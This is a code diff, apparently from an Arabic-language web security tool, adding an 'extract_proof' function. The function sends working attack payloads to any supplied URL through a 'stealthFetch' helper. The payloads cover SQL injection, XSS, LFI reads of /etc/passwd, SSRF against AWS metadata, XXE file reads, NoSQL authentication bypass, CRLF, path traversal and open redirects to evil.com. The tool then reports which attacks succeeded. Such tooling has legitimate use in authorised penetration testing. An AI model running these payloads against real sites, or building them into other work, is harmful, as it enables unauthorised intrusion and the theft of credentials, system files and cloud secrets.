@@ -612,8 +612,20 @@ const tools: Record<string, (args: Record<string, string>) => Promise<string>> =
           wafDetected = true;
           results.push(`  🧱 ${name}: محظور بواسطة ${waf.wafName}`);
         } else {
-          const suspicious = body.toLowerCase().includes("sql") || body.toLowerCase().includes("syntax") || body.toLowerCase().includes("mysql") || resp.status === 500;
-          results.push(`  ${suspicious ? "⚠️" : "✅"} ${name}: ${resp.status} ${suspicious ? "(مشبوه!)" : "(آمن)"}`);
+          const lowerBody = body.toLowerCase();
+          const suspicious = lowerBody.includes("sql") || lowerBody.includes("syntax") || lowerBody.includes("mysql") || lowerBody.includes("postgresql") || lowerBody.includes("sqlite") || lowerBody.includes("ora-") || resp.status === 500;
+          if (suspicious) {
+            // Extract proof snippet
+            const sqlKeywords = ["sql syntax", "mysql", "sqlite", "postgresql", "syntax error", "unclosed quotation", "you have an error"];
+            let proofSnippet = "";
+            for (const kw of sqlKeywords) {
+              const idx = lowerBody.indexOf(kw);
+              if (idx !== -1) { proofSnippet = body.substring(Math.max(0, idx - 20), Math.min(body.length, idx + 80)).trim(); break; }
+            }
+            results.push(`  ⚠️ ${name}: ${resp.status} (مشبوه!)${proofSnippet ? `\n    📸 دليل: "${proofSnippet}"` : ""}`);
+          } else {
+            results.push(`  ✅ ${name}: ${resp.status} (آمن)`);
+          }
         }
       } catch { results.push(`  ❌ ${name}: فشل`); }
     }
@@ -636,6 +648,7 @@ const tools: Record<string, (args: Record<string, string>) => Promise<string>> =
       }
     }
     
+    results.push(`\n💡 استخدم extract_proof لتأكيد أي نتيجة مشبوهة بدليل قاطع`);
     return results.join("\n");
   },
 
@@ -674,7 +687,13 @@ const tools: Record<string, (args: Record<string, string>) => Promise<string>> =
           results.push(`  🧱 ${name}: محظور بواسطة ${waf.wafName}`);
         } else {
           const reflected = body.includes(payload);
-          results.push(`  ${reflected ? "⚠️" : "✅"} ${name}: ${reflected ? "منعكس!" : "مفلتر"}`);
+          if (reflected) {
+            const idx = body.indexOf(payload);
+            const snippet = body.substring(Math.max(0, idx - 30), Math.min(body.length, idx + payload.length + 30)).trim();
+            results.push(`  ⚠️ ${name}: منعكس!\n    📸 دليل: "${snippet}"`);
+          } else {
+            results.push(`  ✅ ${name}: مفلتر`);
+          }
         }
       } catch { results.push(`  ❌ ${name}: فشل`); }
     }
@@ -2369,6 +2388,344 @@ tools.screenshot_site = async (args) => {
   } catch (e) {
     return `❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`;
   }
+};
+
+// ===== PROOF EXTRACTION (PoC) =====
+
+tools.extract_proof = async (args) => {
+  const { url, vuln_type, payload: customPayload } = args;
+  if (!url || !vuln_type) return "❌ مطلوب: url و vuln_type";
+  
+  const results: string[] = [`🔬 استخراج دليل (PoC) — ${vuln_type.toUpperCase()}\n${"═".repeat(50)}\n🎯 الهدف: ${url}\n`];
+  
+  // Get baseline response first
+  let baselineBody = "", baselineStatus = 0, baselineLength = 0;
+  try {
+    const baseResp = await stealthFetch(url);
+    baselineStatus = baseResp.status;
+    baselineBody = await baseResp.text();
+    baselineLength = baselineBody.length;
+    results.push(`📏 الاستجابة الأساسية: ${baselineStatus} (${baselineLength} حرف)\n`);
+  } catch (e) {
+    results.push(`⚠️ فشل الحصول على استجابة أساسية: ${e instanceof Error ? e.message : "خطأ"}\n`);
+  }
+
+  const proofPayloads: Record<string, { payloads: { name: string; payload: string; method?: string; contentType?: string; body?: string }[]; indicators: (body: string, resp: Response) => { found: boolean; evidence: string }[] }> = {
+    sqli: {
+      payloads: [
+        { name: "Error-Based (Quote)", payload: "'" },
+        { name: "Error-Based (Double)", payload: '"' },
+        { name: "Boolean True", payload: "' OR '1'='1'-- " },
+        { name: "Boolean False", payload: "' OR '1'='2'-- " },
+        { name: "Time-Based (3s)", payload: "' OR SLEEP(3)-- " },
+        { name: "UNION Column Count", payload: "' UNION SELECT NULL-- " },
+        { name: "UNION 2 Columns", payload: "' UNION SELECT NULL,NULL-- " },
+        { name: "Comment Bypass", payload: "'/**/OR/**/1=1--" },
+        { name: "Stacked Query", payload: "'; SELECT 1-- " },
+      ],
+      indicators: (body, resp) => {
+        const findings: { found: boolean; evidence: string }[] = [];
+        const sqlErrors = ["sql syntax", "mysql", "sqlite", "postgresql", "ora-", "microsoft sql", "unclosed quotation", "syntax error", "sqlstate", "odbc", "jdbc", "warning: mysql", "you have an error in your sql"];
+        for (const err of sqlErrors) {
+          const idx = body.toLowerCase().indexOf(err);
+          if (idx !== -1) {
+            const snippet = body.substring(Math.max(0, idx - 50), Math.min(body.length, idx + 100));
+            findings.push({ found: true, evidence: `🧬 خطأ SQL مكشوف: "${snippet.trim()}"` });
+          }
+        }
+        if (resp.status === 500) findings.push({ found: true, evidence: `📊 خطأ خادم داخلي (500) — يشير لحقن SQL ناجح` });
+        return findings;
+      }
+    },
+    xss: {
+      payloads: [
+        { name: "Script Tag", payload: '<script>alert("XSS_PROOF_7291")</script>' },
+        { name: "IMG Onerror", payload: '<img src=x onerror=alert("XSS_PROOF_7291")>' },
+        { name: "SVG Onload", payload: '<svg onload=alert("XSS_PROOF_7291")>' },
+        { name: "Event Handler", payload: '" onfocus="alert(\'XSS_PROOF_7291\')" autofocus="' },
+        { name: "Body Onload", payload: '<body onload=alert("XSS_PROOF_7291")>' },
+        { name: "Polyglot", payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert("XSS_PROOF_7291") )//%0D%0A' },
+      ],
+      indicators: (body) => {
+        const findings: { found: boolean; evidence: string }[] = [];
+        if (body.includes("XSS_PROOF_7291")) {
+          const idx = body.indexOf("XSS_PROOF_7291");
+          const snippet = body.substring(Math.max(0, idx - 80), Math.min(body.length, idx + 80));
+          findings.push({ found: true, evidence: `🧬 Payload منعكس في الصفحة: "${snippet.trim()}"` });
+        }
+        if (body.includes('<script>alert("XSS_PROOF_7291")')) {
+          findings.push({ found: true, evidence: `🔴 تم حقن تاغ <script> كاملاً بدون ترشيح!` });
+        }
+        if (body.includes('onerror=alert("XSS_PROOF_7291")')) {
+          findings.push({ found: true, evidence: `🔴 تم حقن event handler بدون ترشيح!` });
+        }
+        return findings;
+      }
+    },
+    lfi: {
+      payloads: [
+        { name: "Direct /etc/passwd", payload: "../../../etc/passwd" },
+        { name: "Double Encode", payload: "..%252f..%252f..%252fetc%252fpasswd" },
+        { name: "Null Byte", payload: "../../../etc/passwd%00" },
+        { name: "UTF-8 Overlong", payload: "..%c0%af..%c0%af..%c0%afetc/passwd" },
+        { name: "Windows web.config", payload: "..\\..\\..\\web.config" },
+        { name: "PHP Wrapper", payload: "php://filter/convert.base64-encode/resource=index.php" },
+      ],
+      indicators: (body) => {
+        const findings: { found: boolean; evidence: string }[] = [];
+        if (body.includes("root:") && (body.includes("/bin/bash") || body.includes("/bin/sh") || body.includes(":/0:"))) {
+          const lines = body.split("\n").filter(l => l.includes("root:") || l.includes("/bin/")).slice(0, 3);
+          findings.push({ found: true, evidence: `🔴 محتوى /etc/passwd مكشوف!\n${lines.map(l => "  → " + l.trim()).join("\n")}` });
+        }
+        if (body.includes("<configuration>") || body.includes("connectionString")) {
+          findings.push({ found: true, evidence: `🔴 ملف web.config مكشوف!` });
+        }
+        return findings;
+      }
+    },
+    ssti: {
+      payloads: [
+        { name: "Jinja2 {{7*7}}", payload: "{{7*7}}" },
+        { name: "Jinja2 {{7*'7'}}", payload: "{{7*'7'}}" },
+        { name: "Mako ${7*7}", payload: "${7*7}" },
+        { name: "ERB <%=7*7%>", payload: "<%=7*7%>" },
+        { name: "Freemarker #{7*7}", payload: "#{7*7}" },
+      ],
+      indicators: (body) => {
+        const findings: { found: boolean; evidence: string }[] = [];
+        if (body.includes("49")) {
+          const idx = body.indexOf("49");
+          const snippet = body.substring(Math.max(0, idx - 30), Math.min(body.length, idx + 30));
+          findings.push({ found: true, evidence: `🧬 تم تنفيذ التعبير الحسابي! الناتج "49" موجود: "${snippet.trim()}"` });
+        }
+        if (body.includes("7777777")) {
+          findings.push({ found: true, evidence: `🧬 تم تنفيذ 7*'7' → "7777777" (دليل Jinja2)` });
+        }
+        return findings;
+      }
+    },
+    ssrf: {
+      payloads: [
+        { name: "Localhost", payload: "http://127.0.0.1" },
+        { name: "AWS Metadata", payload: "http://169.254.169.254/latest/meta-data/" },
+        { name: "IPv6 Localhost", payload: "http://[::1]" },
+        { name: "Hex IP", payload: "http://0x7f000001" },
+        { name: "DNS Rebind", payload: "http://localtest.me" },
+      ],
+      indicators: (body, resp) => {
+        const findings: { found: boolean; evidence: string }[] = [];
+        if (body.includes("ami-id") || body.includes("instance-id") || body.includes("iam")) {
+          findings.push({ found: true, evidence: `🔴 بيانات AWS Metadata مكشوفة!` });
+        }
+        if (body.length > 0 && resp.status === 200 && body.length !== baselineLength) {
+          findings.push({ found: true, evidence: `📊 استجابة مختلفة (${body.length} vs ${baselineLength} حرف) — يشير لـ SSRF` });
+        }
+        return findings;
+      }
+    },
+    cors: {
+      payloads: [
+        { name: "Evil Origin", payload: "https://evil.com" },
+        { name: "Null Origin", payload: "null" },
+        { name: "Subdomain", payload: "https://attacker.target.com" },
+      ],
+      indicators: (body, resp) => {
+        const findings: { found: boolean; evidence: string }[] = [];
+        const acao = resp.headers.get("access-control-allow-origin");
+        const acac = resp.headers.get("access-control-allow-credentials");
+        if (acao === "*") findings.push({ found: true, evidence: `🔴 ACAO: * — أي موقع يمكنه الوصول` });
+        if (acao && acac === "true") findings.push({ found: true, evidence: `🔴 ACAO مع credentials! Origin: ${acao}` });
+        return findings;
+      }
+    },
+    open_redirect: {
+      payloads: [
+        { name: "Direct", payload: "https://evil.com" },
+        { name: "Protocol-relative", payload: "//evil.com" },
+        { name: "Backslash", payload: "/\\evil.com" },
+        { name: "Data URI", payload: "data:text/html,<script>alert(1)</script>" },
+      ],
+      indicators: (body, resp) => {
+        const findings: { found: boolean; evidence: string }[] = [];
+        const loc = resp.headers.get("location") || "";
+        if (loc.includes("evil.com")) findings.push({ found: true, evidence: `🔴 إعادة توجيه إلى evil.com! Location: ${loc}` });
+        return findings;
+      }
+    },
+    xxe: {
+      payloads: [
+        { name: "Basic XXE", payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "XXEPROOF123">]><root>&xxe;</root>', method: "POST", contentType: "application/xml" },
+        { name: "File Read XXE", payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>', method: "POST", contentType: "application/xml" },
+      ],
+      indicators: (body) => {
+        const findings: { found: boolean; evidence: string }[] = [];
+        if (body.includes("XXEPROOF123")) findings.push({ found: true, evidence: `🔴 XXE Entity تم تحليلها!` });
+        return findings;
+      }
+    },
+    nosql: {
+      payloads: [
+        { name: "Always True ($gt)", payload: '{"username":{"$gt":""},"password":{"$gt":""}}', method: "POST", contentType: "application/json" },
+        { name: "Regex All", payload: '{"username":{"$regex":".*"},"password":{"$regex":".*"}}', method: "POST", contentType: "application/json" },
+      ],
+      indicators: (body, resp) => {
+        const findings: { found: boolean; evidence: string }[] = [];
+        if (resp.status === 200 && (body.includes("token") || body.includes("session") || body.includes("success") || body.includes("user"))) {
+          findings.push({ found: true, evidence: `🔴 تجاوز مصادقة NoSQL! الاستجابة تحتوي بيانات جلسة` });
+        }
+        return findings;
+      }
+    },
+    crlf: {
+      payloads: [
+        { name: "CRLF Header", payload: "%0d%0aX-CyberGuard-Proof:CRLF_CONFIRMED" },
+        { name: "CRLF Double", payload: "%0d%0a%0d%0a<h1>CRLF_PROOF</h1>" },
+      ],
+      indicators: (body, resp) => {
+        const findings: { found: boolean; evidence: string }[] = [];
+        if (resp.headers.get("x-cyberguard-proof") === "CRLF_CONFIRMED") findings.push({ found: true, evidence: `🔴 Header مخصص تم حقنه بنجاح!` });
+        if (body.includes("CRLF_PROOF")) findings.push({ found: true, evidence: `🔴 محتوى HTML تم حقنه عبر CRLF!` });
+        return findings;
+      }
+    },
+    path_traversal: {
+      payloads: [
+        { name: "Unix passwd", payload: "../../../etc/passwd" },
+        { name: "Double Encode", payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" },
+        { name: "Windows", payload: "..\\..\\..\\windows\\win.ini" },
+      ],
+      indicators: (body) => {
+        const findings: { found: boolean; evidence: string }[] = [];
+        if (body.includes("root:") || body.includes("/bin/")) findings.push({ found: true, evidence: `🔴 ملف نظام مكشوف!` });
+        if (body.includes("[fonts]") || body.includes("[extensions]")) findings.push({ found: true, evidence: `🔴 ملف win.ini مكشوف!` });
+        return findings;
+      }
+    },
+    clickjacking: {
+      payloads: [{ name: "Header Check", payload: "" }],
+      indicators: (body, resp) => {
+        const findings: { found: boolean; evidence: string }[] = [];
+        const xfo = resp.headers.get("x-frame-options");
+        const csp = resp.headers.get("content-security-policy");
+        if (!xfo && (!csp || !csp.includes("frame-ancestors"))) {
+          findings.push({ found: true, evidence: `🔴 لا يوجد X-Frame-Options ولا frame-ancestors في CSP — الموقع قابل للـ Clickjacking` });
+        }
+        return findings;
+      }
+    },
+    rfi: {
+      payloads: [
+        { name: "External Include", payload: "https://httpbin.org/robots.txt" },
+        { name: "Protocol-relative", payload: "//httpbin.org/robots.txt" },
+      ],
+      indicators: (body) => {
+        const findings: { found: boolean; evidence: string }[] = [];
+        if (body.includes("User-agent") && body.includes("Disallow")) {
+          findings.push({ found: true, evidence: `🔴 محتوى خارجي تم تضمينه! robots.txt من httpbin ظهر في الاستجابة` });
+        }
+        return findings;
+      }
+    },
+  };
+
+  const vulnConfig = proofPayloads[vuln_type];
+  if (!vulnConfig) {
+    return `❌ نوع ثغرة غير مدعوم: ${vuln_type}\n✅ الأنواع المدعومة: ${Object.keys(proofPayloads).join(", ")}`;
+  }
+
+  const payloadsToTest = customPayload 
+    ? [{ name: "Custom Payload", payload: customPayload }, ...vulnConfig.payloads]
+    : vulnConfig.payloads;
+
+  let confirmed = false;
+  const evidenceList: string[] = [];
+  let successPayload = "";
+  let successResponse = "";
+
+  for (const { name, payload, method, contentType, body: reqBody } of payloadsToTest) {
+    try {
+      let testUrl = url;
+      let fetchOptions: RequestInit = { redirect: vuln_type === "open_redirect" ? "manual" : "follow" };
+      
+      if (vuln_type === "cors") {
+        fetchOptions = { headers: { "Origin": payload } };
+      } else if (method === "POST") {
+        fetchOptions.method = "POST";
+        fetchOptions.headers = { "Content-Type": contentType || "application/json" };
+        fetchOptions.body = reqBody || payload;
+      } else if (vuln_type === "crlf") {
+        testUrl = url + payload;
+      } else if (vuln_type === "clickjacking") {
+        // Just check headers
+      } else {
+        testUrl = url.includes("?") 
+          ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) 
+          : url + (vuln_type === "open_redirect" ? encodeURIComponent(payload) : `?q=${encodeURIComponent(payload)}`);
+      }
+
+      const startTime = performance.now();
+      const resp = await stealthFetch(testUrl, fetchOptions);
+      const elapsed = performance.now() - startTime;
+      const respBody = await resp.text();
+
+      // Time-based detection for SQLi
+      if (vuln_type === "sqli" && payload.includes("SLEEP") && elapsed > 2500) {
+        evidenceList.push(`⏱️ Time-Based: الاستجابة استغرقت ${elapsed.toFixed(0)}ms (>2.5s) — دليل SLEEP ناجح!`);
+        confirmed = true;
+        successPayload = payload;
+      }
+
+      // Check response length difference (Boolean-based)
+      if (vuln_type === "sqli" && baselineLength > 0) {
+        const diff = Math.abs(respBody.length - baselineLength);
+        if (diff > baselineLength * 0.1 && diff > 50) {
+          evidenceList.push(`📊 Boolean-Based: فرق الاستجابة ${diff} حرف (${((diff/baselineLength)*100).toFixed(1)}%) — payload: ${name}`);
+        }
+      }
+
+      // Run vulnerability-specific indicators
+      const indicators = vulnConfig.indicators(respBody, resp);
+      for (const ind of indicators) {
+        if (ind.found) {
+          confirmed = true;
+          successPayload = payload;
+          successResponse = respBody.substring(0, 500);
+          evidenceList.push(ind.evidence);
+        }
+      }
+
+      const statusIcon = resp.status >= 500 ? "🔴" : resp.status >= 400 ? "🟡" : "🟢";
+      results.push(`${statusIcon} ${name}: ${resp.status} (${respBody.length} حرف, ${elapsed.toFixed(0)}ms)${indicators.some(i => i.found) ? " ← 🔴 دليل!" : ""}`);
+    } catch (e) {
+      results.push(`  ❌ ${name}: ${e instanceof Error ? e.message : "خطأ"}`);
+    }
+  }
+
+  // Verdict
+  results.push(`\n${"═".repeat(50)}`);
+  if (confirmed) {
+    results.push(`\n🔴 الحكم: ⚠️ ثغرة مؤكدة (CONFIRMED)!\n`);
+    results.push(`📋 الأدلة المستخرجة:`);
+    evidenceList.forEach((e, i) => results.push(`  ${i + 1}. ${e}`));
+    if (successPayload) results.push(`\n🧬 الـ Payload الناجح: ${successPayload}`);
+    if (successResponse) {
+      results.push(`\n📸 لقطة من الاستجابة:`);
+      results.push("```");
+      results.push(successResponse.substring(0, 300));
+      results.push("```");
+    }
+    results.push(`\n⚠️ مستوى الخطورة: عالي — يجب المعالجة فوراً`);
+  } else if (evidenceList.length > 0) {
+    results.push(`\n🟡 الحكم: محتمل (PROBABLE) — أدلة جزئية`);
+    results.push(`📋 مؤشرات:`);
+    evidenceList.forEach((e, i) => results.push(`  ${i + 1}. ${e}`));
+    results.push(`\n💡 توصية: فحص يدوي إضافي مطلوب للتأكيد`);
+  } else {
+    results.push(`\n🟢 الحكم: إيجابي كاذب (FALSE POSITIVE) — لا دليل`);
+    results.push(`✅ لم يتم العثور على أي مؤشرات تؤكد وجود ثغرة ${vuln_type.toUpperCase()}`);
+  }
+
+  return results.join("\n");
 };
 
 serve(async (req) => {
